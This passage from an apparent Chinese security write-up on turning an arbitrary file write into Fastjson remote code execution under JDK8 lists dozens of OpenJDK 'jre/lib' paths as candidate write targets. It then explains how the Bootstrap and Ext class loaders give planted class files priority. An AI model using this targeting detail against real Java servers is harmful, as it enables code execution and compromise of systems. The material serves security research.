<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.161</span><span class="token operator">-</span><span class="token number">0.</span>b14<span class="token punctuation">.</span>el7_4<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.161</span><span class="token operator">-</span><span class="token number">3.</span>b14<span class="token punctuation">.</span>el6_9<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.171</span><span class="token operator">-</span><span class="token number">3.</span>b10<span class="token punctuation">.</span>el6_9<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.171</span><span class="token operator">-</span><span class="token number">8.</span>b10<span class="token punctuation">.</span>amzn2<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.171</span><span class="token operator">-</span><span class="token number">8.</span>b10<span class="token punctuation">.</span>el6_9<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.171</span><span class="token operator">-</span><span class="token number">8.</span>b10<span class="token punctuation">.</span>el7_5<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.181</span><span class="token operator">-</span><span class="token number">3.</span>b13<span class="token punctuation">.</span>amzn2<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.181</span><span class="token operator">-</span><span class="token number">3.</span>b13<span class="token punctuation">.</span>el7_5<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.191</span><span class="token punctuation">.</span>b12<span class="token operator">-</span><span class="token number">0.</span>amzn2<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.191</span><span class="token punctuation">.</span>b12<span class="token operator">-</span><span class="token number">0.</span>el7_5<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.191</span><span class="token punctuation">.</span>b12<span class="token operator">-</span><span class="token number">1.</span>el7_6<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.201</span><span class="token punctuation">.</span>b09<span class="token operator">-</span><span class="token number">0.</span>amzn2<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.201</span><span class="token punctuation">.</span>b09<span class="token operator">-</span><span class="token number">2.</span>el7_6<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.212</span><span class="token punctuation">.</span>b04<span class="token operator">-</span><span class="token number">0.</span>el7_6<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.222</span><span class="token punctuation">.</span>b10<span class="token operator">-</span><span class="token number">0.</span>el7_6<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.282</span><span class="token punctuation">.</span>b08<span class="token operator">-</span><span class="token number">1.</span>el7_9<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.181</span><span class="token operator">-</span><span class="token number">3.</span>b13<span class="token punctuation">.</span>el6_10<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.191</span><span class="token punctuation">.</span>b12<span class="token operator">-</span><span class="token number">0.</span>el6_10<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.212</span><span class="token punctuation">.</span>b04<span class="token operator">-</span><span class="token number">0.</span>el6_10<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.31</span><span class="token operator">-</span><span class="token number">2.</span>b13<span class="token punctuation">.</span><span class="token number">5.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.65</span><span class="token operator">-</span><span class="token number">2.</span>b17<span class="token punctuation">.</span><span class="token number">7.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.77</span><span class="token operator">-</span><span class="token number">0.</span>b03<span class="token punctuation">.</span><span class="token number">9.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token number">.101</span><span class="token operator">-</span><span class="token number">2.6</span><span class="token number">.6</span><span class="token number">.1</span><span class="token punctuation">.</span>el7_2<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token number">.131</span><span class="token operator">-</span><span class="token number">2.6</span><span class="token number">.9</span><span class="token number">.0</span><span class="token punctuation">.</span>el7_3<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.91</span><span class="token operator">-</span><span class="token number">0.</span>b14<span class="token punctuation">.</span><span class="token number">10.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token number">.141</span><span class="token operator">-</span><span class="token number">2.6</span><span class="token number">.10</span><span class="token number">.1</span><span class="token punctuation">.</span>el7_3<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token number">.171</span><span class="token operator">-</span><span class="token number">2.6</span><span class="token number">.13</span><span class="token number">.0</span><span class="token punctuation">.</span>el7_4<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token number">.191</span><span class="token operator">-</span><span class="token number">2.6</span><span class="token number">.15</span><span class="token number">.4</span><span class="token punctuation">.</span>el7_5<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.101</span><span class="token operator">-</span><span class="token number">3.</span>b13<span class="token punctuation">.</span><span class="token number">24.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.111</span><span class="token operator">-</span><span class="token number">1.</span>b15<span class="token punctuation">.</span><span class="token number">25.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.121</span><span class="token operator">-</span><span class="token number">0.</span>b13<span class="token punctuation">.</span><span class="token number">29.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.131</span><span class="token operator">-</span><span class="token number">2.</span>b11<span class="token punctuation">.</span><span class="token number">30.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.141</span><span class="token operator">-</span><span class="token number">1.</span>b16<span class="token punctuation">.</span><span class="token number">32.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.151</span><span class="token operator">-</span><span class="token number">1.</span>b12<span class="token punctuation">.</span><span class="token number">35.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.161</span><span class="token operator">-</span><span class="token number">0.</span>b14<span class="token punctuation">.</span><span class="token number">36.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.171</span><span class="token operator">-</span><span class="token number">7.</span>b10<span class="token punctuation">.</span><span class="token number">37.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.171</span><span class="token operator">-</span><span class="token number">8.</span>b10<span class="token punctuation">.</span><span class="token number">38.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.191</span><span class="token punctuation">.</span>b12<span class="token operator">-</span><span class="token number">0.42</span><span class="token punctuation">.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.201</span><span class="token punctuation">.</span>b09<span class="token operator">-</span><span class="token number">0.43</span><span class="token punctuation">.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.212</span><span class="token punctuation">.</span>b04<span class="token operator">-</span><span class="token number">0.45</span><span class="token punctuation">.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.171</span><span class="token operator">-</span><span class="token number">8.</span>b10<span class="token punctuation">.</span>el7_5<span class="token punctuation">.</span>x86_64<span class="token operator">-</span>debug<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.181</span><span class="token operator">-</span><span class="token number">8.</span>b13<span class="token punctuation">.</span><span class="token number">39.39</span><span class="token punctuation">.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.191</span><span class="token punctuation">.</span>b12<span class="token operator">-</span><span class="token number">0.</span>el7_5<span class="token punctuation">.</span>x86_64<span class="token operator">-</span>debug<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.191</span><span class="token punctuation">.</span>b12<span class="token operator">-</span><span class="token number">0.</span>el6_10<span class="token punctuation">.</span>x86_64<span class="token operator">-</span>debug<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="class-写文件实战" tabindex="-1"><a class="header-anchor" href="#class-写文件实战"><span>class 写文件实战</span></a></h2><blockquote><p><a href="https://threedr3am.github.io/2021/04/13/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84Fastjson%20RCE/" target="_blank" rel="noopener noreferrer">JDK8 任意文件写场景下的 Fastjson RCE | 大彩笔 threedr3am<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p></blockquote><h3 id="原理-2" tabindex="-1"><a class="header-anchor" href="#原理-2"><span>原理</span></a></h3><p><strong><mark>JDK8 下的 Bootstrap 和 Ext ClassLoader</mark></strong></p><p>根据类的双亲委派模型，类的加载顺序会先从 Bootstrap ClassLoader 的加载路径中尝试加载，当找不到该类时，才会选择从下一级的 Ext ClassLoader 的加载路径寻找，以此类推到引发加载的类所在的类加载器为止。</p><p>类加载器中，都会存在着与其对应的类、jar 文件路径，通过探究其路径（mac osx 的 jdk8u241 和 linux 的 openjdk8 环境），可以发现，Bootstrap 和 Ext ClassLoader 对应的类、jar 文件目录有。</p><p>【<strong>mac osx】</strong></p><ul><li><strong>Bootstrap ClassLoader(sun.boot.class.path)</strong></li></ul><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>resources<span class="token punctuation">.</span>jar
